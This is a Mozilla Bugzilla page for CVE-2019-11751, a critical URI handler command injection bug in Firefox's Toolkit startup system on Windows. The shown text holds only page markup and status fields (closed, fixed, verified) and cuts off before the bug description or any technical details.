<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
<meta property="og:type" content="website">
<meta property="og:title" content="1572838 - (CVE-2019-11751) URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">
<meta property="og:url" content="https://bugzilla.mozilla.org/show_bug.cgi?id=1572838">
<meta property="og:description"
      content="VERIFIED (gijskruitbosch+bugs) in Toolkit - Startup and Profile System. Last updated 2020-06-05.">
<meta name="twitter:label1" value="Type">
<meta name="twitter:data1" value="defect">
<meta name="twitter:label2" value="Priority">
<meta name="twitter:data2" value="--">

    <meta name="viewport" content="width=1024">
    <meta name="color-scheme" content="dark light">
    <meta name="generator" content="Bugzilla 20211025.1">
    <meta name="bugzilla-global" content="dummy"
        id="bugzilla-global" data-bugzilla="{&quot;api_token&quot;:&quot;&quot;,&quot;config&quot;:{&quot;basepath&quot;:&quot;\/&quot;},&quot;constant&quot;:{&quot;COMMENT_COLS&quot;:80},&quot;param&quot;:{&quot;maxattachmentsize&quot;:&quot;10240&quot;,&quot;maxusermatches&quot;:&quot;50&quot;,&quot;splinter_base&quot;:&quot;\/page.cgi?id=splinter.html&amp;ignore=\/&quot;},&quot;string&quot;:{&quot;bug_type_required&quot;:&quot;You must select a Type for this bug&quot;,&quot;component_required&quot;:&quot;You must select a Component for this bug&quot;,&quot;description_required&quot;:&quot;You must enter a Description for this bug&quot;,&quot;short_desc_required&quot;:&quot;You must enter a Summary for this bug&quot;,&quot;version_required&quot;:&quot;You must select a Version for this bug&quot;},&quot;user&quot;:{&quot;is_new&quot;:1,&quot;login&quot;:&quot;&quot;}}">
    <title>1572838 - (CVE-2019-11751) URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]</title>

<link rel="Top" href="/">

  


  
    <link rel="Show" title="Dependency Tree"
          href="/showdependencytree.cgi?id=1572838&amp;hide_resolved=1">
      <link rel="Show" title="Dependency Graph"
            href="/showdependencygraph.cgi?id=1572838">

      <link rel="Show" title="Bug Activity"
            href="/show_activity.cgi?id=1572838">

<link href="/static/v20211025.1/skins/yui.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/standard/global.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BugModal/web/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BMO/web/styles/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/EditComments/web/styles/inline-editor.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-structure-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-theme-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/lib/prism.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Needinfo/web/styles/needinfo.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Review/web/styles/badge.css" rel="stylesheet" type="text/css">



    
<script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/js/jquery/jquery-min.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/js/jquery/ui/jquery-ui-min.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/js/yui.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu-min.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/js/jquery/plugins/devbridgeAutocomplete/devbridgeAutocomplete-min.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/js/global.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/js/util.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/js/dropdown.js"></script>

      <script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F">
          YAHOO.namespace('bugzilla');
          if ( "onpagehide" in window || YAHOO.env.ua.gecko) {
              YAHOO.util.Event._simpleRemove(window, "unload",
                                             YAHOO.util.Event._unload);
          }BUGZILLA.value_descs = JSON.parse('{\"bug_status\":{},\"resolution\":{\"\":\"---\"}}');

  
    var tracking_flags_str = "{\"comments\":{\"cf_tracking_firefox95\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox70\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox93\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr78\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox94\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr68\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_a11y_review_project_flag\":{\"requested\":\"Description:\\nPlease provide an explanation of the feature or change. Include a description of the user scenario in which it would be used and how the user would complete the task(s).\\nScreenshots and visual UI specs are welcome, but please include sufficient accompanying explanation so that blind members of the accessibility team are able to understand the feature\/change.\\n\\nHow do we test this?\\nIf there is an implementation to test, please provide instructions for testing it; e.g. setting preferences, other preparation, how to trigger the UI, etc.\\n\\nWhen will this ship?\\nTracking bug\/issue:\\nDesign documents (e.g. Product Requirements Document, UI spec):\\nEngineering lead:\\nProduct manager:\\n\\nThe accessibility team has developed the Mozilla Accessibility Release Guidelines which outline what is needed to make user interfaces accessible:\\nhttps:\/\/wiki.mozilla.org\/Accessibility\/Guidelines\\nPlease describe the accessibility guidelines you considered and what steps you\'ve taken to address them:\\n\\nDescribe any areas of concern to which you want the accessibility team to give special attention:\"},\"cf_tracking_firefox69\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr91\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_relnote\":{\"?\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"},\"cf_tracking_firefox_sumo\":{\"none-needed\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"}},\"types\":[\"tracking\"],\"flags\":{\"tracking\":{\"cf_status_firefox_esr60\":\"unaffected\",\"cf_tracking_firefox93\":\"---\",\"cf_tracking_firefox_esr78\":\"---\",\"cf_status_thunderbird_esr78\":\"---\",\"cf_status_firefox_esr68\":\"verified\",\"cf_tracking_firefox94\":\"---\",\"cf_tracking_thunderbird_esr91\":\"---\",\"cf_status_firefox_esr78\":\"---\",\"cf_status_firefox93\":\"---\",\"cf_tracking_firefox_relnote\":\"---\",\"cf_tracking_thunderbird_esr78\":\"---\",\"cf_status_firefox94\":\"---\",\"cf_tracking_firefox70\":\"+\",\"cf_status_firefox_esr91\":\"---\",\"cf_tracking_firefox95\":\"---\",\"cf_tracking_firefox_esr68\":\"69+\",\"cf_tracking_firefox_esr91\":\"---\",\"cf_status_firefox68\":\"wontfix\",\"cf_status_firefox95\":\"---\",\"cf_tracking_firefox69\":\"+\",\"cf_status_firefox69\":\"verified\",\"cf_status_thunderbird_esr91\":\"---\",\"cf_status_firefox70\":\"verified\"},\"project\":{\"cf_tracking_firefox_sumo\":\"---\",\"cf_webcompat_priority\":\"---\",\"cf_a11y_review_project_flag\":\"---\",\"cf_fission_milestone\":\"---\",\"cf_root_cause\":\"---\"}}}";
    var TrackingFlags = $.parseJSON(tracking_flags_str);

  

  
  BUGZILLA.bug_id = 1572838;
  BUGZILLA.bug_title = '1572838 - (CVE-2019-11751) URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]';
  BUGZILLA.bug_summary = 'URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]';
  BUGZILLA.bug_url = 'https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=1572838';
  BUGZILLA.bug_keywords = 'csectype-priv-escalation, sec-critical',
  BUGZILLA.user = {
    id: 0,
    login: '',
    is_insider: false,
    is_timetracker: false,
    can_tag: false,
    timezone: 'America\/Los_Angeles',
    settings: {
      quote_replies: 'quoted_reply',
      zoom_textareas: true,
      remember_collapsed: true,
      inline_attachments: true,
      autosize_comments: false
    }
  };

  BUGZILLA.bug_secure = false;
      </script>
<script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/extensions/BugModal/web/autosize.min.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/extensions/ProdCompSearch/web/js/prod_comp_search.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/extensions/BugModal/web/bug_modal.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/extensions/BugModal/web/comments.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/extensions/ComponentWatching/web/js/overlay.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/js/bugzilla-readable-status-min.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/js/field.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/js/comments.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/extensions/TrackingFlags/web/js/flags.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/extensions/BMO/web/js/firefox-crash-table.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/extensions/MozChangeField/web/js/severity-s1-priority-p1.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/extensions/MozChangeField/web/js/clear-tracking-priority-s1.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/extensions/MozChangeField/web/js/set-tracking-severity-s1.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/js/lib/prism.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/extensions/GoogleAnalytics/web/js/analytics.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/js/lib/md5.min.js"></script><script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F" src="/static/v20211025.1/extensions/Review/web/js/badge.js"></script>

    

    
    <link rel="search" type="application/opensearchdescription+xml"
                       title="Bugzilla@Mozilla" href="/search_plugin.cgi"><link rel="shortcut icon" href="/extensions/BMO/web/images/favicon.ico">
<link rel="canonical" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1572838">
<link rel="shorturl" href="https://bugzilla.mozilla.org/1572838"><meta name="google-analytics" content="UA-36116321-3" data-location="https://bugzilla.mozilla.org/bug/show-modal" data-title="1572838 - (CVE-2019-11751) URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">
<script async src="https://www.google-analytics.com/analytics.js"></script><meta name="robots" content="noarchive">
  </head>



  <body
        class="bugzilla-mozilla-org
               skin-standard bug_modal yui-skin-sam">



<div id="wrapper">

<header id="header" role="banner">
  <div class="inner">
    <h1 id="header-title" class="title"><a href="https://bugzilla.mozilla.org/home" title="Go to home page">Bugzilla</a></h1>
    <form role="search" id="header-search" class="quicksearch" action="/buglist.cgi" data-no-csrf>
      <section class="searchbox-outer dropdown" role="combobox" aria-expanded="false" aria-haspopup="listbox"
               aria-labelledby="header-search-label" aria-owns="header-search-dropdown">
        <h2 id="header-search-label">Quick Search</h2>
        <span class="icon" aria-hidden="true"></span>
        <input role="searchbox" id="quicksearch_top" class="dropdown-button" name="quicksearch" autocomplete="off"
               value="" placeholder="Search Bugs"
               title="Enter a bug number or some search terms" aria-controls="header-search-dropdown"
               aria-label="Quick Search"><div id="header-search-dropdown" class="dropdown-content right" role="listbox" style="display: none;">
  <div id="header-search-dropdown-wrapper">
  </div>
</div>
      </section>
    </form>
    <nav id="header-nav">
      <ul class="links">
        <li class="link-browse">
          <a href="/describecomponents.cgi" title="Browse bugs by component">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Browse</span>
          </a>
        </li>
        <li class="link-search">
          <a href="/query.cgi?format=advanced" title="Search bugs using various criteria">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Advanced Search</span>
          </a>
        </li>
      </ul>
      <div class="dropdown">
        <button type="button" id="header-tools-menu-button" class="dropdown-button minor" title="More tools…"
                aria-label="More tools…" aria-expanded="false" aria-haspopup="true" aria-controls="header-tools-menu">
          <span class="icon" aria-hidden="true"></span>
        </button>
        <ul class="dropdown-content left" id="header-tools-menu" role="menu" style="display:none;">
          <li role="presentation">
            <a href="/report.cgi" role="menuitem" tabindex="-1">Reports</a>
          </li>
            <li role="separator"></li>
            <li role="presentation">
              <a href="https://bmo.readthedocs.io/en/latest/" role="menuitem" tabindex="-1">Documentation</a>
            </li>
        </ul>
      </div>
    </nav>
      <ul id="header-login" class="links">
          <li id="moz_new_account_container_top"><a href="/createaccount.cgi">New Account</a></li><li id="mini_login_container_top">
  <a id="login_link_top" href="/index.cgi?GoAheadAndLogIn=1"
     class='show_mini_login_form' data-qs-suffix="_top">Log In</a>

  <div id="mini_login_top" class="mini-popup mini_login bz_default_hidden"><span id="github_mini_login_top" class="mini_login_top">
    <form method="post" action="/github.cgi">
      <input type="hidden" name="github_secret" value="2fTOPeZCiEpl8HTiJbkZOj0A3cbopEXhOzqNgEMOR9E3KuEREnDaccOgeD3PcK4mgW1Gw5hkEocUa5PZPBfKLlg9BVqjuwnvPMmpSPk6faHtycH25keKJeen1zegc7JHJr9qFyLTLph4gw6IJPnckLUv1T7vsAibxgtqnFlQykR0axD96FFKh5dI973FJMdMVx8ztKUlufc4NuEHfXYElfkQDfuG4hIm2YPgFKT1B4VCucDpgI3VoxceF5g7vmbi">
      <input type="hidden" name="target_uri" value="https://bugzilla.mozilla.org/show_bug.cgi">
      <input type="image" src="/extensions/GitHubAuth/web/images/sign_in.png" height="22" width="75" align="absmiddle"
             alt="Sign in with GitHub"
             title="Sign in with GitHub"> or
    </form>
  </span>

  <form action="/show_bug.cgi?id=1572838" method="POST"
        data-qs-suffix="_top">

    <input id="Bugzilla_login_top"
           class="bz_login"
           name="Bugzilla_login"
           title="Login"
           placeholder="Email"
           aria-label="Email"
           type="email"
           required
    >
    <input class="bz_password"
           id="Bugzilla_password_top"
           name="Bugzilla_password"
           type="password"
           title="Password"
           placeholder="Password"
           aria-label="Password"
           required
    >
    <input class="bz_password bz_default_hidden bz_mini_login_help" type="text"
           id="Bugzilla_password_dummy_top" value="password"
           title="Password"
    >
      <input type="checkbox" id="Bugzilla_remember_top"
             name="Bugzilla_remember" value="on" class="bz_remember"
                 checked>
      <label for="Bugzilla_remember_top">Remember</label>
    <input type="hidden" name="Bugzilla_login_token"
           value="">
    <input type="submit" name="GoAheadAndLogIn" value="Log in"
           class="check_mini_login_fields"
            id="log_in_top">
    <a href="#" id="hide_mini_login_top" aria-label="Close"
       class="close-button hide_mini_login_form" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
<li id="forgot_container_top">
  <a id="forgot_link_top" href="/index.cgi?GoAheadAndLogIn=1#forgot"
     class='show_forgot_form'
     data-qs-suffix="_top">Forgot Password</a>
  <div id="forgot_form_top" class="mini-popup mini_forgot bz_default_hidden">
  <form action="/token.cgi" method="post">
    <input type="email" name="loginname" size="20" placeholder="Email" aria-label="Email" required>
    <input id="forgot_button_top" value="Reset Password"
           type="submit">
    <input type="hidden" name="a" value="reqpw">
    <input type="hidden" id="token_top" name="token" value="1635623456-_-j3ss8Bxis3I9akpqqKCJ1T2Ik2Ry6Dp-ZBiDnf_DU">
    <a href="#" class="close-button hide_forgot_form" aria-label="Close" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
      </ul><div id="header-external-links" class="dropdown first">
  <button type="button" id="header-external-menu-button" class="dropdown-button minor" title="Mozilla"
          aria-label="Mozilla" aria-expanded="false" aria-haspopup="true" aria-controls="header-external-menu">
    <img src="/static/v20211025.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg" width="32" height="32" alt="">
  </button>
  <ul class="dropdown-content right" id="header-external-menu" role="menu" style="display:none;">
    <li role="presentation">
      <a href="https://www.mozilla.org/" role="menuitem" tabindex="-1">Mozilla Home</a>
    </li>
    <li role="separator"></li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/" role="menuitem" tabindex="-1">Privacy</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/#cookies" role="menuitem" tabindex="-1">Cookies</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/about/legal/" role="menuitem" tabindex="-1">Legal</a>
    </li>
  </ul>
</div>
  </div>
</header> 


<main id="bugzilla-body" tabindex="-1">

<aside id="message-container" role="complementary">
  <noscript>
    <div class="noscript">
      <div class="inner">
        <p>Please enable JavaScript in your browser to use all the features on this site.</p>
      </div>
    </div>
  </noscript>
</aside>

<div id="main-inner">




<div role="toolbar" id="page-toolbar">
  <div role="group" class="buttons">
    <button type="button" id="copy-summary" class="secondary"
      title="Copy bug number and summary to your clipboard">Copy Summary</button>
    <div id="clip-container" style="display:none"><input type="text" id="clip"></div>
    <div class="dropdown">
      <button type="button" id="action-menu-btn" aria-haspopup="true" aria-label="View"
        aria-expanded="false" aria-controls="action-menu" class="dropdown-button secondary">View &#9662;</button>
      <ul class="dropdown-content left" id="action-menu" role="menu" style="display:none;">
        <li role="presentation">
          <a id="action-reset" role="menuitem" tabindex="-1">Reset Sections</a>
        </li>
        <li role="presentation">
          <a id="action-expand-all" role="menuitem" tabindex="-1">Expand All Sections</a>
        </li>
        <li role="presentation">
          <a id="action-collapse-all" role="menuitem" tabindex="-1">Collapse All Sections</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a id="action-history" role="menuitem" tabindex="-1">History</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a href="/rest/bug/1572838" role="menuitem" tabindex="-1">JSON</a>
        </li>
        <li role="presentation">
          <a href="/show_bug.cgi?ctype=xml&amp;id=1572838" role="menuitem" tabindex="-1">XML</a>
        </li>
      </ul>
    </div>
  </div>
</div>



<div role="status" id="io-error" style="display:none"></div>
<div role="status" id="floating-message" style="display:none">
  <div id="floating-message-text"></div>
</div>
<section class="module"
>
  <div class="module-content"
  >
  <div id="summary-container">
    <div class="field indent" id="field-status_summary"
>


  
    <div class=" container">
        <span id="field-value-status_summary">
      <span class="bug-status-label text" data-status="closed">Closed</span>
      <span id="field-value-bug_id">
        <a href="/show_bug.cgi?id=1572838">Bug 1572838</a>
          <span class="edit-hide">(CVE-2019-11751)</span>
      </span>
      <span>
        <span class="bug-time-label">Opened <span class="rel-time" title="2019-08-09 12:42 PDT" data-time="1565379738">2 years ago</span></span>
          <span class="bug-time-label">Closed <span class="rel-time" title="2019-08-21 02:04 PDT" data-time="1566378287">2 years ago</span></span>
      </span>
        </span>
    </div>

  
</div>
<div class="field indent edit-hide"
>


  
    <div class=" container">
      

      <h1 id="field-value-short_desc">URI Handler Command Injection Vulnerability [i<wbr>Defense V-bsk2ottbf1]</h1>
    </div>

  
</div>

    <div class="field edit-show" id="field-short_desc" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc" id="short_desc-help-link" class="help">Summary:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-short_desc">
            URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]

        </span>
    </div>

  
</div>
  </div>
  </div>
</section>


<section class="module" id="module-categories"
>
    <header id="module-categories-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Categories section"
           data-label-collapsed="Expand Categories section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-categories-content"
             aria-expanded="true"
             aria-labeledby="module-categories-title"
             aria-describedby="module-categories-subtitle"></div>
        <h2 class="module-title" id="module-categories-title">Categories</h2>
          <h3 class="module-subtitle" id="module-categories-subtitle">
            (Toolkit :: Startup and Profile System, defect)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-categories-content"
  ><div class="fields-lhs">

    <div class="field" id="field-product"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Toolkit" id="product-help-link" class="help">Product:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-product">
      <div class="name-info-outer dropdown">
        <span id="product-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="product-info">Toolkit
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="product-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Product description and actions">
          <header>
            <div class="title">Toolkit</div>
            <div class="description">The Mozilla Toolkit is a set of APIs, built on top of Gecko, which provide advanced services to XUL applications. These services include Profile Management, Chrome Registration, Browsing History, Extension and Theme Management, Application Update Service, and Safe Mode. (<a href="https://wiki.mozilla.org/Modules/Toolkit">More info</a>)</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Toolkit&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Product</a></div>
            <div><a href="/enter_bug.cgi?product=Toolkit"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Product</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Toolkit"
                         data-label-watch="Watch This Product" data-label-unwatch="Unwatch This Product"
                         data-source="BugModal">Watch This Product</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-component"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Toolkit&component=Startup%20and%20Profile%20System#Startup%20and%20Profile%20System" id="component-help-link" class="help">Component:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-component">
      <div class="name-info-outer dropdown">
        <span id="component-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="component-info">Startup and Profile System
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="component-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Component description and actions">
          <header>
            <div class="title">Toolkit :: Startup and Profile System</div>
            <div class="description">New applications startup system - including shared AppRunner, AppStartup, and profile system.</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Toolkit&amp;component=Startup%20and%20Profile%20System&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Component</a></div>
            <div><a href="/buglist.cgi?product=Toolkit&amp;component=Startup%20and%20Profile%20System&amp;chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__"
                    target="_blank" role="menuitem" tabindex="-1">Recently Fixed Bugs in This Component</a></div>
            <div><a href="/enter_bug.cgi?product=Toolkit&amp;component=Startup%20and%20Profile%20System"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Component</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Toolkit" data-component="Startup and Profile System"
                         data-label-watch="Watch This Component" data-label-unwatch="Unwatch This Component"
                         data-source="BugModal">Watch This Component</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-version"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#version" id="version-help-link" class="help">Version:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-version">
            68 Branch

        </span>
    </div>

  
</div>

    <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform" id="-help-link" class="help">Platform:
        </a>
    </div>


  
    <div class=" container"><div class="field inline" id="field-rep_platform"
>


  
    <div class="value">
        <span id="field-value-rep_platform">
            Unspecified

        </span>
    </div>

  
</div><div class="field indent inline" id="field-op_sys"
>


  
    <div class="value">
        <span id="field-value-op_sys">
            Windows

        </span>
    </div>

  
</div><div class="field indent inline"
>


  
    <div class=" container">
    </div>

  
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field contains-buttons" id="field-bug_type"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type" id="bug_type-help-link" class="help">Type:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_type">
      <span class="bug-type-label iconic-text" data-type="defect">
        <span class="icon" aria-hidden="true"></span>defect</span>
        </span>
    </div>

  
</div>

    <div class="field" id="field-importance"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority" id="importance-help-link" class="help">Priority:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-importance"><div class="field inline" id="field-priority"
>


  
    <div class="value">
        <span id="field-value-priority">
          <em>Not set</em>
        </span>
    </div>

  
</div><div class="field inline" id="field-bug_severity"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity" id="bug_severity-help-link" class="help">Severity:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_severity">
            normal

        </span>
    </div>

  
</div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_points" style="display:none"
>
    <div class="name">Points:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_points">
            ---

        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-tracking"
>
    <header id="module-tracking-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Tracking section"
           data-label-collapsed="Expand Tracking section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-tracking-content"
             aria-expanded="true"
             aria-labeledby="module-tracking-title"
             aria-describedby="module-tracking-subtitle"></div>
        <h2 class="module-title" id="module-tracking-title">Tracking</h2>
          <h3 class="module-subtitle" id="module-tracking-subtitle">
            (<span id="readable-bug-status" data-readable-bug-status="{&quot;cf_root_cause&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr68&quot;:&quot;69+&quot;,&quot;cf_a11y_review_project_flag&quot;:&quot;---&quot;,&quot;cf_tracking_firefox95&quot;:&quot;---&quot;,&quot;status&quot;:&quot;VERIFIED&quot;,&quot;cf_status_firefox_esr91&quot;:&quot;---&quot;,&quot;cf_tracking_firefox70&quot;:&quot;+&quot;,&quot;cf_status_thunderbird_esr91&quot;:&quot;---&quot;,&quot;target_milestone&quot;:&quot;mozilla70&quot;,&quot;cf_status_firefox70&quot;:&quot;verified&quot;,&quot;resolution&quot;:&quot;FIXED&quot;,&quot;cf_status_firefox69&quot;:&quot;verified&quot;,&quot;cf_tracking_firefox69&quot;:&quot;+&quot;,&quot;cf_status_firefox68&quot;:&quot;wontfix&quot;,&quot;cf_tracking_firefox_esr91&quot;:&quot;---&quot;,&quot;cf_status_firefox95&quot;:&quot;---&quot;,&quot;cf_tracking_thunderbird_esr91&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr78&quot;:&quot;---&quot;,&quot;keywords&quot;:[&quot;csectype-priv-escalation&quot;,&quot;sec-critical&quot;],&quot;cf_tracking_firefox94&quot;:&quot;---&quot;,&quot;dupe_of&quot;:null,&quot;id&quot;:1572838,&quot;cf_status_firefox_esr68&quot;:&quot;verified&quot;,&quot;cf_status_thunderbird_esr78&quot;:&quot;---&quot;,&quot;cf_tracking_firefox93&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr60&quot;:&quot;unaffected&quot;,&quot;cf_tracking_firefox_esr78&quot;:&quot;---&quot;,&quot;priority&quot;:&quot;--&quot;,&quot;cf_fission_milestone&quot;:&quot;---&quot;,&quot;cf_tracking_thunderbird_esr78&quot;:&quot;---&quot;,&quot;cf_status_firefox94&quot;:&quot;---&quot;,&quot;cf_status_firefox93&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_relnote&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_sumo&quot;:&quot;---&quot;,&quot;cf_webcompat_priority&quot;:&quot;---&quot;,&quot;flags&quot;:[]}"></span>)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-tracking-content"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-status-view"
>
    <div class="name">
